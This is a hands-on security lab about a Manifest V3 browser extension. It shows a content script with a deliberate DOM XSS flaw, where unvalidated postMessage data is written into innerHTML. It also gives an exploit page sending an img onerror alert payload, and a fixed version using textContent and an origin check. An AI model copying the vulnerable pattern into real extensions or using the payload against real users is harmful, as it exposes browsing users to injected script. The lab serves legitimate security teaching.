# 06 - Hands-on Lab: Vulnerable MV3 Extension

In this lab, you'll exploit a DOM XSS vulnerability in a Manifest V3 extension, then fix it.

## 1. The Vulnerable Extension

**manifest.json**
```json
{
  "manifest_version": 3,
  "name": "VulnExt",
  "version": "1.0",
  "permissions": ["activeTab"],
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"]
    }
  ]
}
```

**content.js**
```javascript
// Listens for postMessage from the web page
window.addEventListener("message", (event) => {
    if (event.data && event.data.type === "RENDER_BANNER") {
        let banner = document.createElement("div");
        // VULNERABILITY: DOM XSS
        banner.innerHTML = event.data.payload; 
        document.body.prepend(banner);
    }
});
```

## 2. The Exploit (Audit Script)
Host this HTML page. When the victim (with the extension installed) visits it, the malicious payload executes in the context of the victim's page.

**exploit.html**
```html
<!DOCTYPE html>
<html>
<head><title>Exploit Page</title></head>
<body>
    <h1>Malicious Site</h1>
    <script>
        // Send a message to the content script
        window.postMessage({
            type: "RENDER_BANNER",
            payload: "<img src='x' onerror='alert(\"XSS via Extension!\")'>"
        }, "*");
    </script>
</body>
</html>
```

## 3. Hardened Remediation
Fix the extension by validating the origin and using safe DOM APIs.

**content.js (Fixed)**
```javascript
window.addEventListener("message", (event) => {
    // 1. Validate Origin (if applicable to a specific app)
    // if (event.origin !== "https://trusted.com") return;
    
    if (event.data && event.data.type === "RENDER_BANNER") {
        let banner = document.createElement("div");
        // 2. Safe DOM assignment
        banner.textContent = event.data.payload; 
        document.body.prepend(banner);
    }
});
```
